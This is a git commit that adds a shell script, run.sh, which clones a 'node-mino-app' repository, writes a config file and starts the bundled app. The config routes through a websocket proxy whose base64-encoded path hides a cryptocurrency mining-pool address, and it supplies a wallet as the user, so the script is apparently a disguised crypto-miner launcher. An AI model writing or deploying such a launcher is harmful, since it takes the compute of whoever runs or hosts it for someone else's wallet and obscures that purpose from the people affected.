1b733b46e6e75c5d74838afe02eb2d5154c17366
taumino56-netizen <taumino56@gmail.com>
2025-11-28 17:19:05 +0700

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+
+# Clone the repository
+git clone https://github.com/ismailalkaf/node-mino-app.git
+
+# Navigate into the repository folder
+cd node-mino-app || exit
+
+# Create a configuration file
+echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "rM5GziBWoT9y4DQaiacGahTvKZze2TpzrB", "password": "c=RVN", "argent": "wasm-mino/2.0", "threads": 2}' > data.txt
+
+# Run the application
+./node app.js
